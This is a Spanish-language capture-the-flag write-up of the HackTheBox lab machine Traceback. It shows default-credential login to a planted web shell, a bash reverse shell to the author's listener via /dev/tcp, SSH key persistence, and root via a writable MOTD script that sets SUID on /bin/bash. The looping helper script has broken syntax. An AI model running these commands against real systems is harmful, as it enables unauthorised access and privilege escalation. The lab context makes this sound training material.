---
date: 2023-05-03 12:00:00
layout: post
title: Traceback Writeup
subtitle: Writeup de la máquina Traceback de la plataforma HackTheBox
description: Realizaré la máquina Traceback explicando el procedimiento para lograr pwnearla. Esta máquina tiene una dificultad Easy.
image: https://snowscan.io/assets/images/htb-writeup-traceback/traceback_logo.png
optimized_image: https://snowscan.io/assets/images/htb-writeup-traceback/traceback_logo.png
category: Writeup
tags:
  - HackTheBox
  - Writeup
  - Linux
author: FredBrave
---
# Enumeración
Empezamos con un escaneo rápido a la ip de la máquina para descubrir los puertos abiertos.
```bash
sudo nmap -p- --open -sS --min-rate 2000 -n -Pn 10.129.193.96 -oG Targeted
sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-04 10:03 EDT
Nmap scan report for 10.129.193.96
Host is up (0.28s latency).
Not shown: 58738 closed tcp ports (reset), 6795 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 50.43 seconds
```
Una vez descubiertos seguimos con un escaneo más contundente hacia los puertos abiertos. Esto es para obtener más información sobre los puertos abiertos como versiones o que tipo de servicio son.
```bash
sudo nmap -p22,80 -sCV 10.129.193.96 -oN Target
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-04 10:06 EDT
Nmap scan report for 10.129.193.96
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9625518e6c830748ce114b1fe56d8a28 (RSA)
|   256 54bd467114bdb242a1b6b02d94143b0d (ECDSA)
|_  256 4dc3f852b885ec9c3e4d572c4a82fd86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.13 seconds
```
Obtenemos que el puerto 22 y el 80 estan abiertos. 
Al revisar el puerto 80 encontramos lo siguiente:
<img class="img" src="/assets/img/machines/Traceback/1.png" width="800">
Revisando mas profundamente encuentro el siguiente mensaje al hacer un CTRL + U.
<img class='img' src="/assets/img/machines/Traceback/2.png" width='500'>
Al buscar este mensaje encuentro un repositorio de github que contiene el nombre de algunas web shells.
<img class='img' src="/assets/img/machines/Traceback/3.png" width='600'>
Al buscar estas web shells en la web encuentro **smevk.php**.
<img class='img' src='/assets/img/machines/Traceback/4.png' width='600'>
# Shell como webadmin
Aqui como ya tenia un posible nombre de usuario que la web me dio **Xh4H**. Intente el mismo en el user y password, pero no funciono. Entonces intente lo tipico admin y admin.
Y este si funciono.
<img class='img' src='/assets/img/machines/Traceback/5.png' width='800'>
En el apartado `Execute` de la web shell me envie una shell a un puerto de mi maquina.
bash -c "bash -i >& /dev/tcp/10.10.16.42/443 0>&1"
```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.42] from (UNKNOWN) [10.129.193.96] 42978
bash: cannot set terminal process group (706): Inappropriate ioctl for device
bash: no job control in this shell
webadmin@traceback:/var/www/html$
```
Hice un tratamiento de la tty y tuve acceso como webadmin 
# Shell como sysadmin
Al enumerar un poco encontre que puedo ejecutar /home/sysadmin/luvit como sysadmin sin necesidad de una clave.
```bash
webadmin@traceback:/var/www/html$ sudo -l
Matching Defaults entries for webadmin on traceback:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/sysadmin/luvit
webadmin@traceback:/var/www/html$ sudo -u 'sysadmin' /home/sysadmin/luvit
Welcome to the Luvit repl!
> print('hola')
hola
>
 ```
Al buscar encontré que es una herramienta para programar en Lua. Entonces buscando encontré que puedo ejecutar comandos con la función os.execute(''). Por lo tanto, solo ejecuté una bash y obtuve un shell.
```bash
> os.execute('bash')
sysadmin@traceback:/var/www/html$ whoami
sysadmin
sysadmin@traceback:/var/www/html$
```
Para seguir me cree unas llaves ssh y la llave publica id\_rsa.pub la pegue en el authorized\_keys de sysadmin.
```bash
sysadmin@traceback:~/.ssh$ ls
authorized_keys
sysadmin@traceback:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCn7R0arHChLrr5PHe6+2lqMwfmftFctUTszf43NZpfEdy+AKL1CDLhHD8dyBRlwK5rwgSaBw0fI0wUoaYMpj2WbZVNnQlfHg+SGH/9zE5yLyIomHxD874qTzc80fbqHlY7+WobG9AHMcemEdrGe6c1Z7PJ3JLTf8WB4gXLQdlPsDrHpOBy7HRmWdZsnh74sribeRGV2R//EXPMrjjD+a7Sz0DWZBamruK+pvh2qJk13T/Xe6mf+EWnO/ysi7TsqPxZ3Xg66Mcel4dSkBqB9m4ehKYLVB6b6cWrU3v1o4DWWtRIlnJ3XJYqK2ZWQ2WfVkLQSF04o7p1tyoOY244UWu9m3xgdwB416r7tY9+9GxgFdN2J1SHCMBVLq+pYYhkLJvbe4X7bZS********************************************************************************************** kali@kali" >> authorized_keys
```
Una vez hecho esto pude conectarme a la maquina a traves de ssh.
```bash
ssh sysadmin@10.129.193.96
The authenticity of host '10.129.193.96 (10.129.193.96)' can't be established.
ED25519 key fingerprint is SHA256:t2eqwvH1bBfzEerEaGcY/lX/lrLq/rpBznQqxrTiVfM.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:208: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.193.96' (ED25519) to the list of known hosts.
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land 



Last login: Mon Mar 16 03:50:24 2020 from 10.10.14.2
$
```
# Shell como root
Enumerando encuentro que tengo permisos en la carpeta /etc/update-motd.d
```bash
ls -la /etc/update-motd.d
total 32
drwxr-xr-x  2 root sysadmin 4096 Apr 22  2021 .
drwxr-xr-x 80 root root     4096 Apr 22  2021 ..
-rwxrwxr-x  1 root sysadmin  981 May  4 08:06 00-header
-rwxrwxr-x  1 root sysadmin  982 May  4 08:06 10-help-text
-rwxrwxr-x  1 root sysadmin 4264 May  4 08:06 50-motd-news
-rwxrwxr-x  1 root sysadmin  604 May  4 08:06 80-esm
-rwxrwxr-x  1 root sysadmin  299 May  4 08:06 91-release-upgrade
```
Al ver el contenido de 00-header me doy cuenta que es un archivo interesante.
```bash
$ cat 00-header
#!/bin/sh
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland <kirkland@canonical.com>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

[ -r /etc/lsb-release ] && . /etc/lsb-release


echo "\nWelcome to Xh4H land \n"
```
Ejecuta un `echo "\nWelcome to xh4H land \n"`. Si estamos atentos veremos que al iniciar una conexion ssh nos ejecuta lo mismo. Por lo que podemos suponer que cada vez que nos conectamos a ssh nos ejecutara este archivo. Entonces introducire lo siguiente al archivo.
```bash
$ echo "chmod +s /bin/bash" >> 00-header
$ echo "chmod +s /bin/bash" >> 00-header
$ echo "chmod +s /bin/bash" >> 00-header
$ echo "chmod +s /bin/bash" >> 00-header
$ echo "chmod +s /bin/bash" >> 00-header
```
En mi caso tuve que hacerlo algunas veces, esto es debido a que hay un cron job que esta actualizando el archivo cada pocos segundos. Lo mejor para esto seria crear un script en bash en un ciclo `While` para que este se ejecute cada poco como el siguiente.
```bash
#!/bin/bash
While True:
    do
     echo "chmod +s /bin/bash" >> /etc/update-motd.d/00-header
    done
``` 
Este script lo creamos en tmp y lo ejecutamos mientras en otra ventana entramos varias veces a la maquina a traves ssh y hacemos un ls -la /bin/bash hasta que encontremos el permiso s en el binario.
```bash
ssh sysadmin@10.129.193.96
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land 



Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu May  4 08:14:47 2023 from 10.10.16.42
$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1113504 Jun  6  2019 /bin/bash
$ bash -p
bash-4.4# whoami
root
bash-4.4#
```
Y hemos conseguido pwnear la maquina!!!
